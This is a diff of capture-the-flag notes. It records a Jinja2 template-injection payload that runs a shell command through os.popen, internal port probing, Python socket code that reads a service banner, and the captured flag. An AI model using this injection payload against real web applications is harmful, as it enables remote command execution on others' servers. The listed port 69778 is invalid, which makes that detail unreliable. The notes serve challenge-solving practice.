@@ -15,7 +15,7 @@ Not sure if it is part of the challenge.
 There is a docker-compose (see docker-compose.yml) that talks about a service that should be down but isn't.\
 Haven't found a way to access it yet.
 
-
+```dalek.py``` launches the web server and kills children processes every 10 secondes, preventing backdoors.
 
 ```py
 {{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
@@ -51,7 +51,7 @@ nmap, nc, and telnet are not installed.
 ```
 
 See port_discovery.js
-port 4242 and 8042 are open
+port 4242, 8042, and 69778 are open
 
 (Using ssti)
 ```
@@ -59,4 +59,22 @@ $ curl toto8042:8042
 this is not the way this time, goodluck !!
 ```
 
-Don't know how to get port 4242 banner.
+used ```python -c "CMD"``` to run python code and get read TCP connection.
+
+https://wiki.python.org/moin/TcpCommunication
+```py
+import socket
+
+TCP_IP = 'toto8042'
+TCP_PORT = 4242
+BUFFER_SIZE = 128
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+data = s.recv(BUFFER_SIZE)
+s.close()
+
+print(data.decode('utf-8'))
+```
+
+flag: ```BFS{doCKErcEpt1On8042}```
